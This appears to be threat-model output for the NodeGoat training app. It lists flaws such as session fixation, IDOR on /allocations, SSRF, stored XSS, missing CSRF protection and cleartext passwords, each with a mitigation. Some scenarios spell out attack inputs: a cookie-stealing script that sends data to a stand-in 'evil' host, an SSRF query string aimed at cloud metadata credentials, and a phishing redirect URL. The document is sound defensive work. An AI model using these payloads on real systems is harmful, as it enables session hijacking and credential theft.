threats.title: Session fixation and weak session binding on the authenticated-route guard
threats.asset: user session state protecting /dashboard and other isLoggedIn routes
threats.attackScenario: express-session is configured with saveUninitialized: true and resave: true and no cookie maxAge in server.js:78-102, and handleLoginRequest never regenerates the session, so an attacker visits the app to obtain a connect.sid, plants it in a victim's browser, waits for the victim to log in — which only sets req.session.userId on that same id — and then reuses the cookie to pass isLoggedInMiddleware at app/routes/session.js:36 for /dashboard.
assumptions: req.session.regenerate is not called anywhere in the login path after successful credential validation.
threats.impactReason: A fixated session grants the attacker the victim's full authenticated context across every isLoggedIn route including /profile.
threats.likelihoodReason: Requires the attacker to set the cookie in the victim's browser first (XSS or a shared subdomain), which the disabled autoescaping makes attainable.

mitigation.summary: Regenerate the session id at login and give the cookie a bounded lifetime.
steps: In app/routes/session.js handleLoginRequest, call req.session.regenerate() before assigning req.session.userId on a successful validateLogin.
Set saveUninitialized: false in server.js:84 so anonymous visitors do not receive a persisted session id.
Add cookie: { httpOnly: true, maxAge: <ttl>, secure: true } to the session options in server.js:92-100 and destroy the session on /logout.

threats.title: isLoggedInMiddleware admits any session holder to /allocations/:userId, exposing other employees' allocations
threats.asset: other employees' retirement allocation records
threats.attackScenario: The guard on this flow only checks req.session.userId (app/routes/session.js:36-42) and app/routes/index.js:63 wires GET /allocations/:userId behind that check alone, so an attacker registers via /signup, notes their own numeric userId from the dashboard link, and then requests /allocations/1, /allocations/2 and so on to read every other employee's stock, fund and bond allocations.
assumptions: Security-relevant events are only sent to console.error and are not captured in any durable audit log.
allocationsHandler.displayAllocations uses the :userId path parameter rather than the session's user id when querying.
threats.impactReason: Every user's allocation record is enumerable one sequential id at a time, since user ids come from an incrementing counter (app/data/user-dao.js:109-120).
threats.likelihoodReason: Self-service signup exists at POST /signup and ids are sequential integers, so no privileged position is needed. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Bind the allocations lookup to the session user, or add an explicit ownership/admin check.
steps: In the displayAllocations handler, ignore req.params.userId and query with req.session.userId, or compare the two and return 404 when they differ.
For admin access, chain sessionHandler.isAdminUserMiddleware (app/routes/session.js:25) on a separate admin route rather than widening /allocations/:userId.
Add the same ownership check pattern to any other route that takes a record id.

threats.title: No throttling in front of the login path that feeds the session guard
threats.asset: user credentials and the ability to serve authenticated requests
threats.attackScenario: POST /login reaches validateLogin (app/data/user-dao.js:57) with a plaintext equality comparison and no attempt counter or lockout, so an attacker scripts thousands of requests per second against /login with a username list, both guessing credentials and saturating the single Node process so legitimate holders of a session cannot get past isLoggedInMiddleware on /dashboard.
assumptions: No account lockout counter is maintained outside the excerpts shown.
No rate limiter or WAF is deployed in front of the Express server.
Security-relevant events are only sent to console.error and are not captured in any durable audit log.
threats.impactReason: Unlimited guessing against passwords compared as plaintext strings leads to account takeover, and the single-threaded server degrades for all users.
threats.likelihoodReason: The login endpoint is unauthenticated and reachable by anyone; scripting it takes no special tooling. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Rate-limit authentication attempts and lock accounts after repeated failures.
steps: Add an express rate-limiting middleware in server.js mounted on POST /login and POST /signup keyed by IP and username.
Track consecutive failures per user in the users collection and reject logins for a cooling-off period once a threshold is crossed.
Log throttled attempts server-side so repeated abuse is visible.

threats.title: Attacker-chosen host in GET /research redirects the server's outbound quote fetch to internal endpoints
threats.asset: internal HTTP-reachable resources and cloud instance metadata returned in the /research response body
threats.attackScenario: app/routes/research.js:15 builds the outbound URL as req.query.url + req.query.symbol with no allow-list, so an attacker requests GET /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=web-role and the server fetches the metadata endpoint with needle.get and writes the response body straight back at line 25, spoofing the intended Yahoo Finance quote service with an attacker-chosen host.
threats.impactReason: Any internal service or metadata endpoint reachable from the app host can be read through the response body, potentially yielding cloud credentials.
threats.likelihoodReason: The url parameter is a plain hidden form field on a GET route and requires only editing a query string.

mitigation.summary: Hardcode the quote provider host and pass only an encoded symbol.
steps: Remove req.query.url from app/routes/research.js:15 and build the URL from a constant base such as https://finance.yahoo.com/quote/.
Append encodeURIComponent(req.query.symbol) and reject symbols that do not match /^[A-Za-z.-]{1,10}$/.
Delete the hidden url input at app/views/research.html:17 so the host is never client-supplied.

threats.title: Unbounded server-side fetch on GET /research lets an attacker exhaust the Node event loop and sockets
threats.asset: availability of the NodeGoat HTTP server
threats.attackScenario: An attacker repeatedly calls GET /research?url=http://<slow-or-huge-endpoint>/&symbol=x, and since app/routes/research.js:16 calls needle.get with no timeout, size limit or concurrency cap, each request pins a socket and buffers the whole upstream body into memory until the single-process Express server stops serving other users.
assumptions: No timeout, response size limit or request rate limit is applied in front of the /research handler.
threats.impactReason: The whole single-process app becomes unresponsive while sockets and memory are consumed by outbound fetches.
threats.likelihoodReason: The route is a plain unauthenticated GET and the target endpoint is attacker-chosen, so slow or large responses are trivial to arrange.

mitigation.summary: Bound the outbound quote fetch and limit request volume.
steps: Pass open_timeout, read_timeout and response_timeout options to needle.get in app/routes/research.js:16.
Cap accepted response size and abort the request when exceeded.
Apply a rate limit to the /research route in app/routes/index.js.

threats.title: Unauthenticated tutorial requests and responses are exposed in cleartext on the browse flow
threats.asset: session cookie sent alongside GET /tutorial requests
threats.attackScenario: GET /tutorial at app/routes/tutorial.js:8 and each GET /tutorial/<page> at app/routes/tutorial.js:31 are served by the same plaintext HTTP listener, so a network attacker who sees a logged-in user request /tutorial/a3 reads the Cookie header carried on that request and injects an extra <script> into the returned tutorial/layout.html to run in the user's browser under the application's origin.
assumptions: The tutorial router is mounted on the same non-TLS listener as the rest of the application and browsers send the session cookie on these same-origin requests.
threats.impactReason: Cleartext delivery lets an on-path attacker both read the session cookie sent with tutorial requests and rewrite the returned HTML on the application's own origin.
threats.likelihoodReason: Requires an on-path network position, but the tutorial pages are unauthenticated and frequently browsed, so the opportunity is broad.

mitigation.summary: Serve the tutorial router over TLS only and set HSTS.
steps: Switch the listener in server.js:145 to the commented https.createServer configuration so /tutorial is only reachable over TLS.
Add helmet.hsts() so browsers upgrade subsequent /tutorial requests automatically.
Use protocol-relative or absolute HTTPS URLs for the vendor assets referenced in app/views/tutorial/layout.html:13-18 to avoid mixed content.

threats.title: Unauthenticated request flooding of the browse flow has no rate limiting in front of the Express server
threats.asset: availability of the RetireEasy application to legitimate users
threats.attackScenario: With saveUninitialized: true at server.js:84 every unauthenticated GET / or GET /tutorial creates and persists a new session, so an attacker loops requests to GET / from a script and exhausts the single-process Node server's memory and session store until logged-in users can no longer load /dashboard.
assumptions: No rate limiter or WAF sits in front of the Express server in the deployed environment.
threats.impactReason: The app runs as a single Node process (Procfile: forever -m 5 server.js) so exhaustion takes the whole service down for all employees.
threats.likelihoodReason: Both routes are unauthenticated and reachable by anyone on the network with a trivial request loop.

mitigation.summary: Stop creating sessions for anonymous visitors and add request rate limiting.
steps: Set saveUninitialized: false and resave: false in the session config at server.js:78-85.
Add an express rate-limiting middleware in server.js before routes(app, db), or enforce per-IP limits at the reverse proxy in front of the container exposed on port 4000 in docker-compose.yml.
Back the session store with an external store rather than the default in-memory store so a flood cannot exhaust process memory.

threats.title: Open redirect on GET /learn sends authenticated users to an attacker-controlled site
threats.asset: login credentials of authenticated users
threats.attackScenario: GET /learn at app/routes/index.js:70 passes req.query.url straight into res.redirect with no allow-list or validation, so an attacker mails a logged-in employee a link to /learn?url=https://evil.example/login that carries the trusted application host, and the victim lands on a cloned RetireEasy login page and types their credentials into it.
assumptions: No upstream middleware rewrites or validates the url query parameter before the handler runs.
threats.impactReason: Credential phishing succeeds because the link originates from the genuine application domain, and the redirect can also leak the Referer.
threats.likelihoodReason: The parameter is directly attacker-controlled and the route only requires a logged-in session, which self-signup provides.

mitigation.summary: Validate the redirect target against an allow-list of known hosts.
steps: In app/routes/index.js:70-73, parse req.query.url and reject any value whose host is not in a hardcoded allow-list, returning 400 instead of redirecting.
Prefer relative paths only: reject any url that does not begin with a single '/'.
Log rejected redirect attempts through the existing error handler in app/routes/error.js.

threats.title: Session cookie and credentials travel over plaintext HTTP on the browser-to-server flow
threats.asset: session cookie (connect.sid) and the authenticated user session it grants
threats.attackScenario: server.js:145 starts the app with http.createServer and the express-session block at server.js:78-102 leaves the `cookie: { httpOnly: true, secure: true }` options commented out, so an attacker on the same Wi-Fi as a logged-in user sniffs the plaintext GET /dashboard request, lifts the session cookie from the Cookie header, and replays it to impersonate the victim on /profile and /allocations/:userId.
assumptions: No TLS-terminating reverse proxy sits in front of the Express server in the deployed environment.
threats.impactReason: A stolen session cookie yields full account takeover, exposing SSN, bank account and routing numbers rendered on /profile.
threats.likelihoodReason: Any network-path observer on an untrusted network can capture the cookie; no exploitation skill beyond passive sniffing is needed.

mitigation.summary: Terminate TLS for all browser traffic and mark the session cookie Secure and HttpOnly.
steps: Uncomment the https.createServer block at server.js:149-155 and remove the http.createServer listener at server.js:145, or place the app behind a TLS-terminating proxy and set app.set('trust proxy', 1).
Enable the commented cookie options in the session config at server.js:92-100 with httpOnly: true, secure: true and a maxAge.
Add helmet.hsts() (helmet is already a dependency in package.json) so browsers refuse plaintext connections.

threats.title: Session fixation and forged requests accepted on authenticated page requests because no CSRF token or session regeneration guards the flow
threats.asset: user session state and the profile records (SSN, bank account) reachable with the session cookie
threats.attackScenario: The csurf middleware and the res.locals.csrftoken helper are commented out at server.js:104-113 while express-session is configured with saveUninitialized: true and resave: true at server.js:78-85, so an attacker hosts a page that auto-submits a form to POST /profile; a victim who is logged in and browsing with the session cookie on the user-browses-app flow has their SSN and bank account fields overwritten without ever visiting the app.
assumptions: CSRF protection is disabled on these state-changing routes, so cross-site request forgery is possible.
No CSRF token check is applied in any other middleware layer in front of the state-changing POST handlers.
threats.impactReason: Forged requests let an attacker change the victim's banking and contribution data, and the fixed session id makes hijacking after login possible.
threats.likelihoodReason: Any web page the victim visits while logged in can send the request; the application ships with CSRF protection disabled in source. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Re-enable csurf and regenerate the session on login.
steps: Uncomment the csrf require at server.js:7 and the app.use(csrf()) block at server.js:104-113; csurf is already declared in package.json.
Render {{csrftoken}} as a hidden input in app/views/profile.html and the other POST forms.
Call req.session.regenerate() on successful login in app/routes/session.js so a pre-set session id cannot be fixed.

threats.title: Reflected script execution on authenticated pages because Swig autoescaping is disabled
threats.asset: session cookie and rendered user data (SSN, bank account) shown on /profile
threats.attackScenario: swig.setDefaults({ autoescape: false }) at server.js:135-142 means template variables such as {{lastName}}, {{ssn}} and {{bankAcc}} in app/views/profile.html:45-57 are emitted raw, so an attacker stores `"><script>fetch('//evil/?c='+document.cookie)</script>` in the lastName field and the payload executes in the victim's browser on every authenticated page request, exfiltrating the session cookie which carries no HttpOnly flag.
assumptions: Values such as lastName and ssn reach the template without per-field escaping outside of firstNameSafeString.
threats.impactReason: Script execution in an authenticated context steals the session cookie and the SSN and bank data rendered on the same page.
threats.likelihoodReason: Autoescaping is globally off and only one field uses a SafeString helper, so any user-controlled field rendered on a page is an injection point.

mitigation.summary: Turn Swig autoescaping back on and escape remaining raw outputs.
steps: Set autoescape: true in swig.setDefaults at server.js:135-142 (the fix is already present as a comment).
Remove the per-field SafeString workaround for firstName in app/routes/profile.js so all fields use the engine's escaping.
Enable helmet.contentSecurityPolicy() at server.js:51 as a second layer; helmet is already a dependency.

threats.title: Any logged-in user can read another user's retirement allocations via GET /allocations/:userId
threats.asset: other users' retirement fund allocation records
threats.attackScenario: GET /allocations/:userId at app/routes/index.js:63 passes through isLoggedIn but the handler performs no ownership or role check, so an attacker registers an account, reads their own userId from the Allocations link in app/views/layout.html:56, and then requests /allocations/1, /allocations/2 and so on to harvest every other employee's allocation records.
assumptions: Security-relevant events are only sent to console.error and are not captured in any durable audit log.
userId values are small sequential identifiers that can be enumerated.
threats.impactReason: Every user's financial allocation record becomes readable one id at a time by any registered account.
threats.likelihoodReason: Self-registration via POST /signup is open and the attack is a simple path-parameter change. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Bind the allocations lookup to the session's own user id.
steps: In app/routes/allocations.js, compare req.params.userId with req.session.userId and return 404 when they differ, or ignore the path parameter entirely and use the session id.
Add the isAdmin middleware already defined at app/routes/index.js:27 for any legitimate cross-user view.

threats.title: Login credentials submitted over plaintext HTTP on POST /login can be captured in transit
threats.asset: login credentials and the session cookie
threats.attackScenario: The flow user-login-post carries userName and password to POST /login over HTTP while server.js:145 starts the application with http.createServer(app) and leaves the HTTPS server block commented out at lines 149-155, so an attacker on the same Wi-Fi or an upstream network hop sniffs the urlencoded POST body and replays the captured username/password (and the connect.sid cookie set without `secure`) to log in as the victim.
assumptions: No TLS-terminating reverse proxy or HSTS-enforcing load balancer sits in front of the Express server in deployment.
threats.impactReason: Captured credentials give full account takeover of a retirement-savings account holding SSN and bank account numbers, and the same passwords are stored in cleartext server-side.
threats.likelihoodReason: Any attacker positioned on the network path of a login reaches the plaintext body with no authentication or special access.

mitigation.summary: Serve the login flow only over HTTPS and mark the session cookie secure.
steps: Uncomment and use the https.createServer(httpsOptions, app) block in server.js:149-155 instead of http.createServer at line 145, or terminate TLS at a proxy and redirect all HTTP to HTTPS.
Enable helmet.hsts() (already imported and commented at server.js:54) so browsers never downgrade the /login POST.
Set cookie: { httpOnly: true, secure: true } in the express-session options at server.js:78-102.

threats.title: Unrestricted repeated POST /login attempts allow credential brute force against the login flow
threats.asset: user accounts and session identifiers
threats.attackScenario: The user-login-post flow reaches handleLoginRequest, which calls userDAO.validateLogin for every submission with no attempt counter, lockout or delay anywhere in app/routes/session.js, so an attacker scripts thousands of POST /login requests per minute against a harvested username to guess its password and simultaneously saturates the single-process Express server and its MongoDB findOne calls.
assumptions: No rate-limiting or account-lockout middleware is applied in front of the login route in deployment.
Security-relevant events are only sent to console.error and are not captured in any durable audit log.
threats.impactReason: Successful guessing yields account takeover, and sustained request volume degrades availability of the single Node process for all users.
threats.likelihoodReason: The login endpoint is reachable by any anonymous client and automated guessing requires no special position. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Rate limit and lock out repeated failed logins.
steps: Add an express-rate-limit middleware bound to POST /login where routes are registered, keyed by IP and userName.
Track consecutive failures per user in the users collection and temporarily reject logins after a threshold in app/routes/session.js handleLoginRequest.
Log failed-login bursts so lockouts are observable.

threats.title: Username-enumerating login errors on POST /login narrow credential guessing
threats.asset: valid account usernames
threats.attackScenario: handleLoginRequest renders the distinct message "Invalid username" when userDAO.validateLogin reports err.noSuchUser (app/routes/session.js:60, 82-89) while a wrong password returns a different message, with the identical-error fix left commented at line 86-87, so an attacker POSTs a candidate userName with a junk password to /login, reads which message came back, and builds a list of real accounts to target with password guessing.
assumptions: Security-relevant events are only sent to console.error and are not captured in any durable audit log.
threats.impactReason: Confirmed usernames make subsequent guessing and credential-stuffing against this cleartext-password application far more efficient.
threats.likelihoodReason: The distinction is returned to any unauthenticated caller of POST /login and is trivially scriptable. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Return one identical error for unknown-user and wrong-password outcomes.
steps: Use the existing `errorMessage` constant ("Invalid username and/or password") at app/routes/session.js:59 for both the noSuchUser and invalidPassword branches, as the commented fix at line 87 indicates.
Add a constant-time delay or shared code path so response timing does not reintroduce the distinction.

threats.title: Weak signup password policy on POST /signup lets one-character passwords be registered and guessed
threats.asset: user accounts and their session identifiers
threats.attackScenario: validateSignup on the POST /signup path enforces only PASS_RE = /^.{1,20}$/ at app/routes/session.js:144, with the stronger policy commented out at line 148, so an attacker registers or a victim chooses a one-character password and the attacker then guesses it against POST /login to take over the account and its session cookie.
assumptions: No password-strength check is applied by any middleware upstream of handleSignup.
threats.impactReason: A guessed password yields full access to the victim's retirement profile including SSN and bank account fields.
threats.likelihoodReason: Any anonymous visitor can register, and trivially weak passwords are accepted by default, though the attacker still has to guess a given victim's choice.

mitigation.summary: Enforce a strong password policy on signup.
steps: Replace PASS_RE at app/routes/session.js:144 with the commented stronger expression at line 148 requiring at least 8 characters with mixed case and digits.
Reject the password when it equals the userName or appears in a common-password list before calling userDAO.addUser.

threats.title: Passwords submitted to POST /signup are written to MongoDB in cleartext
threats.asset: user credentials (stored passwords)
threats.attackScenario: The signup flow user-signup-post delivers the `password` field from the POST /signup body straight into UserDAO.addUser, which stores `password` verbatim in the users collection at app/data/user-dao.js:25 with the bcrypt.hashSync fix commented out at line 29, so an attacker who obtains any read access to the Mongo `users` collection (or triggers an injection/backup leak) reads every member's plaintext password and reuses it on other sites.
threats.impactReason: Every account password is recoverable without cracking, enabling mass account takeover and credential stuffing against other services.
threats.likelihoodReason: Storage is unconditionally cleartext for every signup, but exploitation requires first reaching the database or a dump of it.

mitigation.summary: Hash signup passwords with bcrypt before persisting and verify with a constant-time compare.
steps: In app/data/user-dao.js:25 replace `password` with `password: bcrypt.hashSync(password, bcrypt.genSaltSync())` using the bcrypt-nodejs module already required at line 1.
Replace the `fromDB === fromUser` comparison in validateLogin at app/data/user-dao.js:61 with bcrypt.compareSync(fromUser, fromDB).
Migrate existing cleartext passwords by rehashing on next successful login and blanking the plaintext field.

threats.title: Unauthenticated signup flooding via POST /signup exhausts the users and counters collections
threats.asset: availability of the signup service and the MongoDB users collection
threats.attackScenario: Each POST /signup carried by user-signup-post runs handleSignup, which does a getUserByUserName lookup, a findAndModify increment on the counters collection (app/data/user-dao.js:109-120) and an allocations write in prepareUserData, with no CAPTCHA or throttle, so an attacker loops signup requests with generated userNames to inflate the users and allocations collections and keep the single Node process busy on database round trips.
assumptions: No CAPTCHA, rate limiter or email-verification gate stands in front of the signup route in deployment.
threats.impactReason: Storage growth and sustained database writes degrade service for legitimate users and pollute the account namespace.
threats.likelihoodReason: The endpoint accepts anonymous requests and the loop is trivial to script, though the impact is disruption rather than data loss.

mitigation.summary: Throttle and verify account creation.
steps: Apply an express-rate-limit middleware to POST /signup keyed by source IP where routes are registered.
Require email verification before prepareUserData writes allocations in app/routes/session.js handleSignup.
Cap the rate of getNextSequence increments or add a per-IP daily account creation limit.

questions.text: When a user fails to log in or changes their profile/benefits data, is that event written to a durable audit log or SIEM (not just printed to console via console.error)?
questions.whyAsking: Without a durable audit trail, you can't detect or investigate account takeover attempts or fraudulent benefit/profile changes after the fact.
options: No, only console.error output is produced, nothing durable
Yes, security events are written to a persistent log store or SIEM
questions.defaultAssumption: Security-relevant events are only sent to console.error and are not captured in any durable audit log.

questions.text: Is CSRF protection actually active on the POST routes /profile, /contributions, /benefits, and /memos, given that the csurf require is commented out in server.js?
questions.whyAsking: If CSRF middleware is disabled, an attacker can trick a logged-in user's browser into submitting profile, contribution, benefit, or memo changes without their consent.
options: No, csurf is commented out and no other CSRF protection is applied
Yes, csurf or an equivalent CSRF protection is enabled on these routes
questions.defaultAssumption: CSRF protection is disabled on these state-changing routes, so cross-site request forgery is possible.

questions.text: Does the MongoDB instance used by NodeGoat require authentication with a least-privilege application account, rather than being reachable on port 27017 with no credentials as configured in docker-compose?
questions.whyAsking: An unauthenticated database that's network-reachable lets anyone who can reach port 27017 read or modify all application data, including user credentials and benefit records.
options: No, MongoDB has no authentication configured as shown in docker-compose
Yes, authentication and a least-privilege account are enforced (e.g. in production config not shown here)
questions.defaultAssumption: MongoDB has no authentication enabled and is reachable without credentials, matching the docker-compose configuration.
